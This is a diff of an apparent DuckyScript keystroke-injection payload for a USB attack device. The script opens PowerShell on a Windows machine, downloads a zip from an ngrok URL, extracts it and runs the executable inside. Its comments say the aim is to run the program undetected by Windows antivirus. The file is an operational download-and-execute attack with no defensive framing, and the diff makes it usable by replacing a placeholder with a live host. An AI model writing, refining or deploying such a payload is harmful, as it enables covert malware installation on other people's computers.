@@ -1,23 +1,41 @@
 REM This script opens Powershell, downloads a program and preferbly runs it in powershells process to go undetected by windows av
 REM Create a command line driven porgram
+DELAY 2000
+GUI d
+DELAY 500
 GUI r 
+DELAY 2000
 STRING powershell 
 ENTER
 REM Create the destination folder
+DELAY 1000
 STRING [system.io.directory]::CreateDirectory("C:\voc0")
 ENTER
 REM Invoke a WebRequest and download the payload as zip
-STRING $payload = 'https://pastebin?'
-SHIFT-ENTER
+DELAY 1000
+STRING $payload = 'https://0197-2001-9e8-2f9e-fd00-532-67a5-1c71-322f.eu.ngrok.io/upload/pico/script.zip'
+SHIFT ENTER
+DELAY 1000
 STRING $dest = 'c:\voc0\payload.zip'
-SHIFT-ENTER
+SHIFT ENTER
+DELAY 1000
 STRING Invoke-WebRequest -Uri $payload -OutFile $dest
 ENTER
 REM Extract the downloaded zip
-STRING Expand-Archive -LiteralPath 'c:\voc0\payload.zip' -DestinationPath 'c:\voc0\nzip\'
+DELAY 1000
+STRING Expand-Archive -Force -LiteralPath 'c:\voc0\payload.zip' -DestinationPath 'c:\voc0\nzip\'
 ENTER
 REM cd to the payload dir and execute it
+DELAY 1000
+REM cd to root
+STRING cd ..
+ENTER
+DELAY 500
+STRING cd ..
+ENTER
+DELAY 500
 STRING cd 'c:\voc0\nzip\'
 ENTER
-STRING .\payload.exe
+DELAY 1000
+STRING .\script.exe
 ENTER
